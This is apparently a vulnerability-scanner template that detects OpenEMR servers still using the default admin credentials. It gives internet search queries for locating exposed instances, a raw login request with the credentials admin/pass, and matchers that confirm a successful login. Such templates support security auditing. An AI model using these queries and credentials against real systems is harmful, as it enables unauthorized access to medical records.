id: openemr-default-login

info:
  name: OpenEMR - Default Admin Discovery
  author: Geekby
  severity: high
  description: |
    OpenEMR default admin credentials were discovered.
  reference:
    - https://github.com/openemr/openemr-devops/tree/master/docker/openemr/6.1.0/#openemr-official-docker-image
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
    cpe: cpe:2.3:a:open-emr:openemr:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: open-emr
    product: openemr
    shodan-query:
      - http.html:"openemr"
      - http.favicon.hash:"1971268439"
      - http.title:"openemr setup tool"
      - http.title:"openemr"
    fofa-query:
      - app="openemr"
      - body="openemr"
      - icon_hash=1971268439
      - title="openemr setup tool"
      - title="openemr"
    google-query:
      - intitle:"openemr setup tool"
      - intitle:"openemr"
    runzero-match: service["http.body"] matches "OpenEMR"
  tags: openemr,default-login

http:
  - raw:
      - |
        POST /interface/main/main_screen.php?auth=login&site=default HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        new_login_session_management=1&languageChoice=1&authUser={{user}}&clearPass={{pass}}&languageChoice=10

    attack: pitchfork
    payloads:
      user:
        - admin
      pass:
        - pass

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "main.php?token_main="
          - "OpenEMR"
        condition: and

      - type: status
        status:
          - 302

